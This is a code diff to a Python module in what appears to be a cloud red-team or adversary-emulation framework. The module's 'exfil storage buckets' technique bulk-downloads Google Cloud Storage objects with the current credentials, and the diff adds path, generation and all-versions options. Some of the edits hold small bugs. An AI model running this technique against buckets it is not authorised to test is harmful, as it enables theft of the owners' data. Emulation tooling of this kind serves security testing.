@@ -30,7 +30,7 @@ class GCPExfilStorageBuckets(BaseTechnique):
                 "Ensure sufficient disk space is available when exfiltrating large buckets"
             ),
             TechniqueNote(
-                "Use folder_path parameter to target specific sensitive data directories"
+                "Use path parameter to target specific sensitive data directories"
             ),
             TechniqueNote(
                 "Use download_limit to control data volumes when exfiltrating large buckets"
@@ -101,20 +101,24 @@ class GCPExfilStorageBuckets(BaseTechnique):
             progress_dict['failed'] += 1
             return False, str(e)
 
-    def _filter_blobs(self, blobs: List[storage.Blob], folder_path: str = None, 
-                     download_limit: int = None) -> List[storage.Blob]:
+    def _filter_blobs(self, blobs: List[storage.Blob], path: str = None, 
+                     download_limit: int = None, generation: int = None, versioned: bool = False) -> List[storage.Blob]:
         """Filters blobs based on folder path and download limit"""
         filtered_blobs = []
         
         for blob in blobs:
-            if folder_path:
+            if path and path != "":
                 # Normalize path separators for cross-platform compatibility
-                norm_folder_path = os.path.normpath(folder_path)
+                norm_path = os.path.normpath(path)
                 norm_blob_name = os.path.normpath(blob.name)
-                if not norm_blob_name.startswith(norm_folder_path):
+                if not norm_blob_name.startswith(norm_path):
                     continue
-                    
-            filtered_blobs.append(blob)
+
+                if versioned and (generation and blob.generation != generation):
+                    continue
+            if not blob.name.endswith("/"):
+        
+                filtered_blobs.append(blob)
             
             if download_limit and len(filtered_blobs) >= download_limit:
                 break
@@ -126,9 +130,14 @@ class GCPExfilStorageBuckets(BaseTechnique):
         
         try:
             bucket_name: str = kwargs.get("bucket_name")
-            folder_path: str = kwargs.get("folder_path")
+            path: str = kwargs.get("path")
             download_limit: int = kwargs.get("download_limit")
             max_workers: int = kwargs.get("max_workers", 10)
+            generation: int = int(kwargs['generation']) if kwargs['generation'] else None
+            all_versions: bool = kwargs.get("all_versions", False)
+
+            if (generation or generation == 0) and (path.endswith("/") or path == "" or all_versions):
+                raise ValueError("The path field should not a folder or all versions is not ticked on when generation field is not empty")
 
             # Input validation
             if bucket_name in [None, ""]:
@@ -139,6 +148,15 @@ class GCPExfilStorageBuckets(BaseTechnique):
 
             # Input sanitization - remove any path separators from bucket name
             bucket_name = os.path.basename(bucket_name)
+            
+            if path.startswith("/"):
+                path = path.lstrip("/")
+            version_enabled : bool = None
+
+            
+                
+            if generation or all_versions:
+                version_enabled = True
 
             # Create storage client using current credentials
             manager = GCPAccess()
@@ -161,7 +179,7 @@ class GCPExfilStorageBuckets(BaseTechnique):
                 }
 
             # List all blobs
-            blobs = list(bucket.list_blobs())
+            blobs = list(bucket.list_blobs(prefix=path, versions=version_enabled))
             if not blobs:
                 return ExecutionStatus.SUCCESS, {
                     "message": f"No objects found in bucket {bucket_name}",
@@ -175,7 +193,7 @@ class GCPExfilStorageBuckets(BaseTechnique):
                 }
 
             # Filter blobs based on folder path and limit
-            filtered_blobs = self._filter_blobs(blobs, folder_path, download_limit)
+            filtered_blobs = self._filter_blobs(blobs, path, download_limit, generation, version_enabled)
             
             # Create download directory with timestamp in a cross-platform way
             dt_stamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
@@ -194,8 +212,12 @@ class GCPExfilStorageBuckets(BaseTechnique):
                 futures = []
                 
                 for blob in filtered_blobs:
-                    local_path = os.path.join(base_download_path, blob.name)
-                    
+                    if version_enabled :
+                        name, format = os.path.splitext(blob.name)
+                        filename = f"{name}-{blob.generation}{format}"
+                        local_path = os.path.join(base_download_path, filename)
+                    else :
+                        local_path = os.path.join(base_download_path, blob.name)
                     future = executor.submit(
                         self._download_blob,
                         blob,
@@ -218,7 +240,7 @@ class GCPExfilStorageBuckets(BaseTechnique):
                     "failed": progress['failed'],
                     "total_size_bytes": progress['downloaded_size'],
                     "download_path": base_download_path,
-                    "folder_filtered": bool(folder_path),
+                    "folder_filtered": bool(path),
                     "download_limited": bool(download_limit)
                 }
             }
@@ -238,11 +260,11 @@ class GCPExfilStorageBuckets(BaseTechnique):
                 "name": "Bucket Name",
                 "input_field_type": "text"
             },
-            "folder_path": {
+            "path": {
                 "type": "str",
                 "required": False,
                 "default": None,
-                "name": "Folder Path",
+                "name": "Path",
                 "input_field_type": "text"
             },
             "download_limit": {
@@ -258,5 +280,19 @@ class GCPExfilStorageBuckets(BaseTechnique):
                 "default": 10,
                 "name": "Max Worker Threads",
                 "input_field_type": "number"
-            }
+            },
+            "generation": {
+                "type": "str", 
+                "required": False, 
+                "default": None, 
+                "name": "Generation", 
+                "input_field_type" : "text"
+            },
+            "all_versions": {
+                "type": "bool",
+                "required": False,
+                "default": False,
+                "name": "All Versions",
+                "input_field_type": "bool"
+            },
         }
